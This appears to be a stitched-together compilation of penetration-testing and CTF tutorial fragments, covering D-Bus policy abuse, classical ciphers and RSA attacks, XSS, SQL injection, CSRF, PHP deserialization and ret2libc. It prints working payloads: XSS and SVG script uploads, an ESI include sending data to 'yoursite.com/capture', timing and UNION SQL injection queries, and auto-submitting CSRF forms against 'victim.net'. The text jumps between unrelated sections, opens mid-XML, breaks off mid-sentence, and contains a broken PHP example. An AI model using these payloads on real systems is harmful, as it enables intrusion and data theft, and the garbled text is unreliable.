receive_sender=\"fi.w1.wpa_supplicant1\" receive_type=\"signal\"/> </policy> Therefore, if a policy is allowing your user in anyway to interact with the bus , you could be able to exploit it to escalate privileges (maybe just listing for some passwords?). Note that a policy that doesn't specify any user or group affects everyone ( <policy> ). Policies to the context \"default\" affects everyone not affected by other policies ( <policy context=\"default\" ).

However, a large part of CTFs is breaking widely used encryption schemes which are improperly implemented. The math may seem daunting, but more often than not, a simple understanding of the underlying principles will allow you to find flaws and crack the code. The word \u201ccryptography\u201d technically means the art of writing codes. When it comes to digital forensics, it\u2019s a method you can use to understand how data is constructed for your analysis. What is cryptography used for? Uses in every day software Securing web traffic (passwords, communication, etc.) Securing copyrighted software code Malicious uses Hiding malicious communication Hiding malicious code Topics XOR Cesear Cipher Substitution Cipher Vigenere Cipher Hashing Functions RSA XOR Data Representation Data can be represented in different bases, an 'A' needs to be a numerical representation of Base 2 or binary so computers can understand them XOR Basics An XOR or eXclusive OR is a bitwise operation indicated by ^ and shown by the following truth table: A B A ^ B 0 0 0 0 1 1 1 0 1 1 1 0 So what XOR'ing bytes in the action 0xA0 ^ 0x2C translates to is: 1 0 1 0 0 0 0 0 0 0 1 0 1 1 0 0 1 0 0 0 1 1 0 0 0b10001100` is equivelent to `0x8C`, a cool property of XOR is that it is reversable meaning `0x8C ^ 0x2C = 0xA0` and `0x8C ^ 0xA0 = 0x2C What does this have to do with CTF? XOR is a cheap way to encrypt data with a password. Any data can be encrypted using XOR as shown in this Python example: >>> data = 'CAPTURETHEFLAG' >>> key = 'A' >>> encrypted = ''.join([chr(ord(x) ^ ord(key)) for x in data]) >>> encrypted '\\x02\\x00\\x11\\x15\\x14\\x13\\x04\\x15\\t\\x04\\x07\\r\\x00\\x06' >>> decrypted = ''.join([chr(ord(x) ^ ord(key)) for x in encrypted]) >>> decrypted 'CAPTURETHEFLAG' This can be extended using a multibyte key by iterating in parallel with the data. Exploiting XOR Encryption Single Byte XOR Encryption Single Byte XOR Encryption is trivial to bruteforce as there are only 255 key combinations to try. Multibyte XOR Encryption Multibyte XOR gets exponentially harder the longer the key, but if the encrypted text is long enough, character frequency analysis is a viable method to find the key. Character Frequency Analysis means that we split the cipher text into groups based on the number of characters in the key. These groups then are bruteforced using the idea that some letters appear more frequently in the english alphabet than others. Substitution Cipher A Substitution Cipher is system of encryption where different symobls substitute a normal alphabet. Caesar Cipher/ROT 13 The Caesar Cipher or Caesar Shift is a cipher which uses the alphabet in order to encode texts. CAESAR` encoded with a shift of 8 is `KIMAIZ` so `ABCDEFGHIJKLMNOPQRSTUVWXYZ` becomes `IJKLMNOPQRSTUVWXYZABCDEFGH ROT13 is the same thing but a fixed shift of 13, this is a trivial cipher to bruteforce because there are only 25 shifts. Vigenere Cipher A Vigenere Cipher is an extended Caesar Cipher where a message is encrypted using various Caesar shifted alphabets. The following table can be used to encode a message: Encryption For example, encrypting the text SUPERSECRET with CODE would follow this process: CODE gets padded to the length of SUPERSECRET so the key becomes CODECODECOD For each letter in SUPERSECRET we use the table to get the Alphabet to use, in this instance row C and column S The ciphertext's first letter then becomes U We eventually get UISITGHGTSW Decryption Go to the row of the key, in this case C Find the letter of the cipher text in this row, in this case U The column is the first letter of the decrypted ciphertext, so we get S After repeating this process we get back to SUPERSECRET Hashing Functions Hashing functions are one way functions which theoretically provide a unique output for every input. MD5, SHA-1, and other hashes which were considered secure are now found to have collisions or two different pieces of data which produce the same supposed unique output. String Hashing A string hash is a number or string generated using an algorithm that runs on text or data. The idea is that each hash should be unique to the text or data (although sometimes it isn\u2019t). For example, the hash for \u201cdog\u201d should be different from other hashes. You can use command line tools tools or online resources such as this one. Example: $ echo -n password | md5 5f4dcc3b5aa765d61d8327deb882cf99 Here, \u201cpassword\u201d is hashed with different hashing algorithms: SHA-1 : 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8 SHA-2 : 5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8 MD5 : 5F4DCC3B5AA765D61D8327DEB882CF99 CRC32 : BBEDA74F Generally, when verifying a hash visually, you can simply look at the first and last four characters of the string. File Hashing A file hash is a number or string generated using an algorithm that is run on text or data. The premise is that it should be unique to the text or data. If the file or text changes in any way, the hash will change. What is it used for? - File and data identification - Password/certificate storage comparison How can we determine the hash of a file? You can use the md5sum command (or similar). $ md5sum samplefile.txt 3b85ec9ab2984b91070128be6aae25eb samplefile.txt Hash Collisions A collision is when two pieces of data or text have the same cryptographic hash. This is very rare. What\u2019s significant about collisions is that they can be used to crack password hashes. Passwords are usually stored as hashes on a computer, since it\u2019s hard to get the passwords from hashes. If you bruteforce by trying every possible piece of text or data, eventually you\u2019ll find something with the same hash. Enter it, and the computer accepts it as if you entered the actual password. Two different files on the same hard drive with the same cryptographic hash can be very interesting. \u201cIt\u2019s now well-known that the cryptographic hash function MD5 has been broken,\u201d said Peter Selinger of Dalhousie University . \u201cIn March 2005, Xiaoyun Wang and Hongbo Yu of Shandong University in China published an article in which they described an algorithm that can find two different sequences of 128 bytes with the same MD5 hash.\u201d For example, he cited this famous pair: and Each of these blocks has MD5 hash 79054025255fb1a26e4bc422aef54eb4. Selinger said that \u201cthe algorithm of Wang and Yu can be used to create files of arbitrary length that have identical MD5 hashes, and that differ only in 128 bytes somewhere in the middle of the file. Several people have used this technique to create pairs of interesting files with identical MD5 hashes.\u201d Ben Laurie has a nice website that visualizes this MD5 collision . For a non-technical, though slightly outdated, introduction to hash functions, see Steve Friedl\u2019s Illustrated Guide . And here\u2019s a good article from DFI News that explores the same topic. RSA RSA, which is an abbreviation of the author's names (Rivest\u2013Shamir\u2013Adleman), is a cryptosystem which allows for asymmetric encryption. Asymmetric cryptosystems are alos commonly referred to as Public Key Cryptography where a public key is used to encrypt data and only a secret, private key can be used to decrypt the data. Definitions The Public Key is made up of ( n , e ) The Private Key is made up of ( n , d ) The message is represented as m and is converted into a number The encrypted message or ciphertext is represented by c p and q are prime numbers which make up n e is the public exponent n is the modulus and its length in bits is the bit length (i.e. 1024 bit RSA) d is the private exponent The totient \u03bb( n ) is used to compute d and is equal to the lcm( p -1, q -1), another definition for \u03bb( n ) is that \u03bb( pq ) = lcm(\u03bb( p ), \u03bb( q )) What makes RSA viable? If public n , public e , private d are all very large numbers and a message m holds true for 0 < m < n , then we can say: ( m e ) d \u2261 m (mod n ) The triple equals sign in this case refers to modular congruence which in this case means that there exists an integer k such that (m e)d = kn + m RSA is viable because it is incredibly hard to find d even with m , n , and e because factoring large numbers is an arduous process. Implementation RSA follows 4 steps to be implemented: 1. Key Generation 2. Encryption 3. Decryption Key Generation We are going to follow along Wikipedia's small numbers example in order to make this idea a bit easier to understand. In This example we are using Carmichael's totient function where \u03bb(n) = lcm(\u03bb(p), \u03bb(q)), but Euler's totient function is perfectly valid to use with RSA. Euler's totient is \u03c6(n) = (p \u2212 1)(q \u2212 1) Choose two prime numbers such as: p = 61 and q = 53 Find n = pq = 3233 Calculate \u03bb( n ) = lcm( p -1, q -1) \u03bb(3233) = lcm(60, 52) = 780 Choose a public exponent such that 1 < e < \u03bb( n ) and is coprime (not a factor of) \u03bb( n ). The standard is most cases is 65537, but we will be using: e = 17 Calculate d as the modular multiplicative inverse or in english find d such that: d x e mod \u03bb(n) = 1 d x 17 mod 780 = 1 d = 413 Now we have a public key of (3233, 17) and a private key of (3233, 413) Encryption With the public key, m can be encrypted trivially The ciphertext is equal to m e mod n or: c = m ^17 mod 3233 Decryption With the private key, m can be decrypted trivially as well The plaintext is equal to c d mod n or: m = c ^413 mod 3233 Exploitation From the RsaCtfTool README Attacks: Weak public key factorization Wiener's attack Hastad's attack (Small public exponent attack) Small q (q < 100,000) Common factor between ciphertext and modulus attack Fermat's factorisation for close p and q Gimmicky Primes method Past CTF Primes method Self-Initializing Quadratic Sieve (SIQS) using Yafu Common factor attacks across multiple keys Small fractions method when p/q is close to a small fraction Boneh Durfee Method when the private exponent d is too small compared to the modulus (i.e d < n0.292) Elliptic Curve Method Pollards p-1 for relatively smooth numbers Mersenne primes factorization Exercise (4 pt) Pseudo Random Primes A wiser once said: \"every number can be factored to the sum of primes.\" Try to factor the number and find me some flag.

Abusing hop-by-hop headers Cache Poisoning/Cache Deception HTTP Request Smuggling H2C Smuggling Server Side Inclusion/Edge Side Inclusion Uncovering Cloudflare XSLT Server Side Injection User input Most of the web applications will allow users to input some data that will be processed later.

Reflected Values If the introduced data may somehow being reflected in the response, the page might be vulnerable to several issues. Client Side Template Injection Command Injection CRLF Dangling Markup File Inclusion/Path Traversal Open Redirect Prototype Pollution to XSS Server Side Inclusion/Edge Side Inclusion Server Side Request Forgery Server Side Template Injection Reverse Tab Nabbing XSLT Server Side Injection XSS XSSI XS-Search Some of the mentioned vulnerabilities requires special conditions, others just require the content to be reflected. You can find some interesting polygloths to test quickly the vulnerabilities in: Reflecting Techniques - PoCs and Polygloths CheatSheet XSS (Cross Site Scripting) Methodology Check if any value you control ( parameters , path , headers ?, cookies ?) is being reflected in the HTML or used by JS code. Find the context where it's reflected/used. If reflected Check which symbols can you use and depending on that, prepare the payload: In raw HTML : Can you create new HTML tags? Can you use events or attributes supporting javascript: protocol? Can you bypass protections? Is the HTML content being interpreted by any client side JS engine ( AngularJS , VueJS , Mavo ...), you could abuse a Client Side Template Injection . If you cannot create HTML tags that execute JS code, could you abuse a Dangling Markup - HTML scriptless injection ? Inside a HTML tag : Can you exit to raw HTML context? Can you create new events/attributes to execute JS code? Does the attribute where you are trapped support JS execution? Can you bypass protections? Inside JavaScript code : Can you escape the <script> tag? Can you escape the string and execute different JS code? Are your input in template literals ``? Can you bypass protections? If used : You could exploit a DOM XSS , pay attention how your input is controlled and if your controlled input is used by any sink. Reflected values In order to successfully exploit a XSS the first thing you need to find is a value controlled by you that is being reflected in the web page. Intermediately reflected : If you find that the value of a parameter or even the path is being reflected in the web page you could exploit a Reflected XSS . Stored and reflected : If you find that a value controlled by you is saved in the server and is reflected every time you access a page you could exploit a Stored XSS . Accessed via JS : If you find that a value controlled by you is being access using JS you could exploit a DOM XSS . Contexts When trying to exploit a XSS the first thing you need to know if where is your input being reflected . Depending on the context, you will be able to execute arbitrary JS code on different ways. Raw HTML If your input is reflected on the raw HTML page you will need to abuse some HTML tag in order to execute JS code: <img , <iframe , <svg , <script ... these are just some of the many possible HTML tags you could use. Also, keep in mind Client Side Template Injection . Inside HTML tags attribute If your input is reflected inside the value of the attribute of a tag you could try: To escape from the attribute and from the tag (then you will be in the raw HTML) and create new HTML tag to abuse: \"><img [...] If you can escape from the attribute but not from the tag ( > is encoded or deleted), depending on the tag you could create an event that executes JS code: \" autofocus onfocus=alert(1) x=\" If you cannot escape from the attribute ( \" is being encoded or deleted), then depending on which attribute your value is being reflected in if you control all the value or just a part you will be able to abuse it. For example , if you control an event like onclick= you will be able to make it execute arbitrary code when it's clicked. Another interesting example is the attribute href , where you can use the javascript: protocol to execute arbitrary code: href=\"javascript:alert(1)\" If your input is reflected inside \" unexpoitable tags \" you could try the accesskey trick to abuse the vuln (you will need some kind of social engineer to exploit this): \" accesskey=\"x\" onclick=\"alert(1)\" x=\" Inside JavaScript code In this case your input is reflected between <script> [...] </script> tags of a HTML page, inside a .js file or inside an attribute using javascript: protocol: If reflected between <script> [...] </script> tags, even if your input if inside any kind of quotes, you can try to inject </script> and escape from this context. This works because the browser will first parse the HTML tags and then the content, therefore, it won't notice that your injected </script> tag is inside the HTML code. If reflected inside a JS string and the last trick isn't working you would need to exit the string, execute your code and reconstruct the JS code (if there is any error, it won't be executed: '-alert(1)-' ';-alert(1)// \\';alert(1)// If reflected inside template literals you can **embed JS expressions** using `${ ... }` syntax: var greetings =`Hello, ${alert(1)}``` DOM There is JS code that is using unsafely some data controlled by an attacker like location.href . An attacker, could abuse this to execute arbitrary JS code. https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/dom-xss.md Universal XSS These kind of XSS can be found anywhere . They not depend just on the client exploitation of a web application but on any context . These kind of arbitrary JavaScript execution can even be abuse to obtain RCE , read arbitrary files in clients and servers, and more. Some examples : https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.md https://github.com/carlospolop/hacktricks/blob/master/pentesting/pentesting-web/xss-to-rce-electron-desktop-apps.md Injecting inside raw HTML When your input is reflected inside the HTML page or you can escape and inject HTML code in this context the first thing you need to do if check if you can abuse < to create new tags: Just try to reflect that char and check if it's being HTML encoded or deleted of if it is reflected without changes . Only in the last case you will be able to exploit this case . For this cases also keep in mind Client Side Template Injection . Note: A HTML comment can be closed using --> or --!> In this case and if no black/whitelisting is used, you could use payloads like: <script>alert(1)</script> <img src=x onerror=alert(1) /> <svg onload=alert('XSS')> But, if tags/attributes black/whitelisting is being used, you will need to brute-force which tags you can create. Once you have located which tags are allowed , you would need to brute-force attributes/events inside the found valid tags to see how you can attack the context. Tags/Events brute-force Go to https://portswigger.net/web-security/cross-site-scripting/cheat-sheet and click on Copy tags to clipboard . Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can brute force all the events using the valid tags (in the same web page click on Copy events to clipboard and follow the same procedure as before). Custom tags If you didn't find any valid HTML tag, you could try to create a custom tag and and execute JS code with the onfocus attribute.

Click XSS - Clickjacking If in order to exploit the vulnerability you need the user to click a link or a form with prepopulated data you could try to abuse Clickjacking (if the page is vulnerable). Impossible - Dangling Markup If you just think that it's impossible to create an HTML tag with an attribute to execute JS code , you should check Danglig Markup because you could exploit the vulnerability without executing JS code. XSS Abusing other vulnerabilities XSS to SSRF Got XSS on a site that uses caching ? Try upgrading that to SSRF through Edge Side Include Injection with this payload: <esi:include src=\"http://yoursite.com/capture\" /> Use it to bypass cookie restrictions, XSS filters and much more!

XSS in dynamic created PDF If a web page is creating a PDF using user controlled input, you can try to trick the bot that is creating the PDF into executing arbitrary JS code . So, if the PDF creator bot finds some kind of HTML tags , it is going to interpret them, and you can abuse this behaviour to cause a Server XSS . https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.md If you cannot inject HTML tags it could be worth it to try to inject PDF data : https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/pdf-injection.md XSS uploading files (svg) Upload as an image a file like the following one (from http://ghostlulz.com/xss-svg/): Content-Type: multipart/form-data; boundary=---------------------------232181429808 Content-Length: 574 -----------------------------232181429808 Content-Disposition: form-data; name=\"img\"; filename=\"img.svg\" Content-Type: image/svg+xml <?xml version=\"1.0\" standalone=\"no\"?> <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"> <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" /> <script type=\"text/javascript\"> alert(1); </script> </svg> -----------------------------232181429808-- <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <script type=\"text/javascript\">alert(\"XSS\")</script> </svg> <?xml version=\"1.0\" standalone=\"no\"?> <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"> <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/> <script type=\"text/javascript\"> alert(\"XSS\"); </script> </svg> XSS resources https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection http://www.xss-payloads.com https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt https://github.com/materaj/xss-list https://github.com/ismailtasdelen/xss-payload-list https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec https://netsec.expert/2020/02/01/xss-in-2020.html XSS TOOLS Find some tools for XSS here . Search functionalities If the functionality may be used to search some kind of data inside the backend, maybe you can (ab)use it to search arbitrary data. File Inclusion/Path Traversal NoSQL Injection LDAP Injection ReDoS SQL Injection XAPTH Injection SQL Injection What is SQL injection? SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database . It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users , or any other data that the application itself is able to access . In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behaviour. In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack. (From here ). In this POST I'm going to suppose that we have found a possible SQL injection and we are going to discuss possible methods to confirm the SQL injection, recon the database and perform actions. Entry point detection You may have found a site that is apparently vulnerable to SQL i just because the server is behaving weird with SQLi related inputs. Therefore, the first thing you need to do is how to inject data in the query without breaking it. To do so you first need to find how to escape from the current context. These are some useful examples: [Nothing] ' \" ` ') \") `) ')) \")) `)) Then, you need to know how to fix the query so there isn't errors . In order to fix the query you can input data so the previous query accept the new data , or you can just input your data and add a comment symbol add the end . Note that if you can see error messages or you can spot differences when a query is working and when it's not this phase will be more easy. Comments MySQL #comment -- comment [Note the space after the double dash] /*comment*/ /*! MYSQL Special SQL */ PostgreSQL --comment /*comment*/ MSQL --comment /*comment*/ Oracle --comment SQLite --comment /*comment*/ HQL HQL does not support comments Confirming with logical operations One of the best ways to confirm a SQL injection is by making it operate a logical operation and having the expected results. For example: if the GET parameter ?username=Peter returns the same content as ?username=Peter' or '1'='1 then, you found a SQL injection. Also you can apply this concept to mathematical operations . Example: If ?id=1 returns the same as ?id=2-1 , SQLinjection. page.asp?id=1 or 1=1 -- true page.asp?id=1' or 1=1 -- true page.asp?id=1\" or 1=1 -- true page.asp?id=1 and 1=2 -- false Confirming with Timing In some cases you won't notice any change on the page you are testing. Therefore, a good way to discover blind SQL injections is making the DB perform actions and will have an impact on the time the page need to load. Therefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete: MySQL (string concat and logical ops) 1' + sleep(10) 1' and sleep(10) 1' && sleep(10) 1' | sleep(10) PostgreSQL (only support string concat) 1' || pg_sleep(10) MSQL 1' WAITFOR DELAY '0:0:10' Oracle 1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10) SQLite 1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) 1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) In some cases the sleep functions won't be allowed . Then, instead of using those functions you could make the query perform complex operations that will take several seconds. Examples of these techniques are going to be commented separately on each technology (if any) . Identifying Back-end The best way to identify the back-end is trying to execute functions of the different back-ends. You could use the sleep functions of the previous section or these ones: [\"conv('a',16,2)=conv('a',16,2)\" ,\"MYSQL\"], [\"connection_id()=connection_id()\" ,\"MYSQL\"], [\"crc32('MySQL')=crc32('MySQL')\" ,\"MYSQL\"], [\"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\" ,\"MSSQL\"], [\"@@CONNECTIONS>0\" ,\"MSSQL\"], [\"@@CONNECTIONS=@@CONNECTIONS\" ,\"MSSQL\"], [\"@@CPU_BUSY=@@CPU_BUSY\" ,\"MSSQL\"], [\"USER_ID(1)=USER_ID(1)\" ,\"MSSQL\"], [\"ROWNUM=ROWNUM\" ,\"ORACLE\"], [\"RAWTOHEX('AB')=RAWTOHEX('AB')\" ,\"ORACLE\"], [\"LNNVL(0=123)\" ,\"ORACLE\"], [\"5::int=5\" ,\"POSTGRESQL\"], [\"5::integer=5\" ,\"POSTGRESQL\"], [\"pg_client_encoding()=pg_client_encoding()\" ,\"POSTGRESQL\"], [\"get_current_ts_config()=get_current_ts_config()\" ,\"POSTGRESQL\"], [\"quote_literal(42.5)=quote_literal(42.5)\" ,\"POSTGRESQL\"], [\"current_database()=current_database()\" ,\"POSTGRESQL\"], [\"sqlite_version()=sqlite_version()\" ,\"SQLITE\"], [\"last_insert_rowid()>1\" ,\"SQLITE\"], [\"last_insert_rowid()=last_insert_rowid()\" ,\"SQLITE\"], [\"val(cvar(1))=1\" ,\"MSACCESS\"], [\"IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0\" ,\"MSACCESS\"], [\"cdbl(1)=cdbl(1)\" ,\"MSACCESS\"], [\"1337=1337\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"], [\"'i'='i'\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"], Also, if you have access to the output of the query, you could make it print the version of the database . A continuation we are going to discuss different methods to exploit different kinds of SQL Injection. We will use MySQL as example. Exploiting Union Based Detecting number of columns If you can see the output of the query this is the best way to exploit it. First of all, wee need to find out the number of columns the initial request is returning. This is because both queries must return the same number of columns . Two methods are typically used for this purpose: Order/Group by Keep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query. 1' ORDER BY 1--+ #True 1' ORDER BY 2--+ #True 1' ORDER BY 3--+ #True 1' ORDER BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True 1' GROUP BY 1--+ #True 1' GROUP BY 2--+ #True 1' GROUP BY 3--+ #True 1' GROUP BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True UNION SELECT Select more and more null values until the query is correct: 1' UNION SELECT null-- - Not working 1' UNION SELECT null,null-- - Not working 1' UNION SELECT null,null,null-- - Worked You should use null values as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case. Extract database names, table names and column names On the next examples we are going to retrieve the name of all the databases, the table name of a database, the column names of the table: #Database names -1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata #Tables of a database -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database] #Column names -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name] There is a different way to discover this data on every different database, but it's always the same methodology. Forms, WebSockets and PostMsgs When websocket, post message or a form allows user to perform actions vulnerabilities may arise. Cross Site Request Forgery Cross-site WebSocket hijacking (CSWSH) PostMessage Vulnerabilities CSRF (Cross Site Request Forgery) What is CSRF? Cross-site request forger y (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform . This is done by making a logged in user in the victim platform access an attacker controlled website and from there execute * malicious JS code, send forms or retrieve \"images\" to the* victims account . Requisites In order to be able to abuse a CSRF vulnerability you first need to find a relevant action to abuse (change password or email, make the victim follow you on a social network, give you more privileges...). The session must rely only on cookies or HTTP Basic Authentication header , any other header can't be used to handle the session. An finally, there shouldn't be unpredictable parameters on the request. Several counter-measures could be in place to avoid this vulnerability. Common defenses SameSite cookies : If the session cookie is using this flag, you may not be able to send the cookie from arbitrary web sites. Cross-origin resource sharing : Depending on which kind of HTTP request you need to perform to abuse the relevant action, you may take int account the CORS policy of the victim site . Note that the CORS policy won't affect if you just want to send a GET request or a POST request from a form and you don't need to read the response. Ask for the password user to authorise the action. Resolve a captcha Read the Referrer or Origin headers. If a regex is used it could be bypassed form example with: http://mal.net?orig=http://example.com (ends with the url) http://example.com.mal.net (starts with the url) Modify the name of the parameters of the Post or Get request Use a CSRF token in each session. This token has to be send inside the request to confirm the action. This token could be protected with CORS. CSRF map Exploit Examples Exfiltrating CSRF Token If a CSRF token is being used as defence you could try to exfiltrate it abusing a XSS vulnerability or a Dangling Markup vulnerability. GET using HTML tags <img src=\"http://google.es?param=VALUE\" style=\"display:none\" /> <h1>404 - Page not found</h1> The URL you are requesting is no longer available Other HTML5 tags that can be used to automatically send a GET request are: Form GET request <html> <!-- CSRF PoC - generated by Burp Suite Professional --> <body> <script>history.pushState('', '', '/')</script> <form method=\"GET\" action=\"https://victim.net/email/change-email\"> <input type=\"hidden\" name=\"email\" value=\"some@email.com\" /> <input type=\"submit\" value=\"Submit request\" /> </form> <script> document.forms[0].submit(); </script> </body> </html> Form POST request <html> <body> <script>history.pushState('', '', '/')</script> <form action=\"https://victim.net/email/change-email\" id=\"csrfform\"> <input type=\"hidden\" name=\"email\" value=\"some@email.com\" autofocus onfocus=\"csrfform.submit();\" /> <!-- Way 1 to autosubmit --> <input type=\"submit\" value=\"Submit request\" /> <img src=x onerror=\"csrfform.submit();\" /> <!-- Way 2 to autosubmit --> </form> <script> document.forms[0].submit(); //Way 3 to autosubmit </script> </body> </html> Form POST request through iframe <!-- The request is sent through the iframe withuot reloading the page --> <html> <body> <iframe style=\"display:none\" name=\"csrfframe\"></iframe> <form action=\"/change-email\" id=\"csrfform\" target=\"csrfframe\"> <input type=\"hidden\" name=\"email\" value=\"some@email.com\" autofocus onfocus=\"csrfform.submit();\" /> <input type=\"submit\" value=\"Submit request\" /> </form> <script> document.forms[0].submit(); </script> </body> </html> Tools https://github.com/0xInfection/XSRFProbe HTTP Headers Depending on the HTTP headers given by the web server some vulnerabilities might be present. Clickjacking Content Security Policy bypass Cookies Hacking CORS - Misconfigurations & Bypass Bypasses There are several specific functionalities were some workarounds might be useful to bypass them 2FA/OPT Bypass Bypass Payment Process Captcha Bypass Login Bypass Race Condition Rate Limit Bypass Reset Forgotten Password Bypass Registration Vulnerabilities Structured objects / Specific functionalities Some functionalities will require the data to be structured on a very specific format (like a language serialized object or a XML). Therefore, it's more easy to identify is the application might be vulnerable as it needs to be processing that kind of data. Some specific functionalities my be also vulnerable if a specific format of the input is used (like Email Header Injections). Deserialization Email Header Injection JWT Vulnerabilities XML External Entity Deserialization Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML. In many occasions you can find some code in the server side that unserialize some object given by the user. In this case, you can send a malicious payload to make the server side behave unexpectedly. You should read: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html for learn how to attack. PHP Magic method used with serialization: __sleep is called when an object is serialized and must be returned to array Magic method used with deserialization __wakeup is called when an object is deserialized. __destruct is called when PHP script end and object is destroyed. __toString uses object as string but also can be used to read file or more than that based on function call inside it. <?php class test { public $s = \"This is a test\"; public function displaystring(){ echo $this->s.'<br />'; } public function __toString() { echo '__toString method called'; } public function __construct(){ echo \"__construct method called\"; } public function __destruct(){ echo \"__destruct method called\"; } public function __wakeup(){ echo \"__wakeup method called\"; } public function __sleep(){ echo \"__sleep method called\"; return array(\"s\"); #The \"s\" makes references to the public attribute } } $o = new test(); $o->displaystring(); $ser=serialize($o); echo $ser; $unser=unserialize($ser); $unser->displaystring(); /* php > $o = new test(); __construct method called__destruct method called php > $o->displaystring(); This is a test<br /> php > $ser=serialize($o); __sleep method called php > echo $ser; O:4:\"test\":1:{s:1:\"s\";s:14:\"This is a test\";} php > $unser=unserialize($ser); __wakeup method called__destruct method called php > $unser->displaystring(); This is a test<br /> */ ?> If you look to the results you can see that the functions __wakeup and __destruct are called when the object is deserialized. Note that in several tutorials you will find that the __toString function is called when trying yo print some attribute, but apparently that's not happening anymore . Autoload Classes may also be dangerous . You can read an explained PHP example here : https://www.notsosecure.com/remote-code-execution-via-php-unserialize/, here https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf or here https://securitycafe.ro/2015/01/05/understanding-php-object-injection/ Serializing Referenced Values If for some reason you want to serialize a value as a reference to another value serialized you can: <?php class AClass { public $param1; public $param2; } $o = new WeirdGreeting; $o->param1 =& $o->param22; $o->param = \"PARAM\"; $ser=serialize($o); Files Functionalities that allow to upload files might be vulnerable to several issues. Functionalities that generates files including user input might execute unexpected code. Users that open files uploaded by users or automatically generated including user input might be compromised.

As we saw in buffer overflows , having stack control can be very powerful since it allows us to overwrite saved instruction pointers, giving us control over what the program does next. Most programs don't have a convenient give_shell function however, so we need to find a way to manually invoke system or another exec function to get us our shell. 32 bit Imagine we have a program similar to the following: #include <stdio.h> #include <stdlib.h> char name[32]; int main() { printf(\"What's your name? \"); read(0, name, 32); printf(\"Hi %s\\n\", name); printf(\"The time is currently \"); system(\"/bin/date\"); char echo[100]; printf(\"What do you want me to echo back? \"); read(0, echo, 1000); puts(echo); return 0; } We obviously have a stack buffer overflow on the echo variable which can give us EIP control when main returns. But we don't have a give_shell function! So what can we do? We can call system with an argument we control! Since arguments are passed in on the stack in 32-bit Linux programs (see calling conventions ), if we have stack control, we have argument control. When main returns, we want our stack to look like something had normally called system . Recall what is on the stack after a function has been called: ... // More arguments 0xffff0008: 0x00000002 // Argument 2 0xffff0004: 0x00000001 // Argument 1 ESP -> 0xffff0000: 0x080484d0 // Return address So main 's stack frame needs to look like this: 0xffff0008: 0xdeadbeef // system argument 1 0xffff0004: 0xdeadbeef // return address for system ESP -> 0xffff0000: 0x08048450 // return address for main (system's PLT entry) Then when main returns, it will jump into system 's PLT entry and the stack will appear just like system had been called normally for the first time. Note: we don't care about the return address system will return to because we will have already gotten our shell by then! Arguments This is a good start, but we need to pass an argument to system for anything to happen. As mentioned in the page on ASLR , the stack and dynamic libraries \"move around\" each time a program is run, which means we can't easily use data on the stack or a string in libc for our argument. In this case however, we have a very convenient name global which will be at a known location in the binary (in the BSS segment). Putting it together Our exploit will need to do the following: Enter \"sh\" or another command to run as name Fill the stack with Garbage up to the saved EIP The address of system 's PLT entry A fake return address for system to jump to when it's done The address of the name global to act as the first argument to system 64 bit In 64-bit binaries we have to work a bit harder to pass arguments to functions. The basic 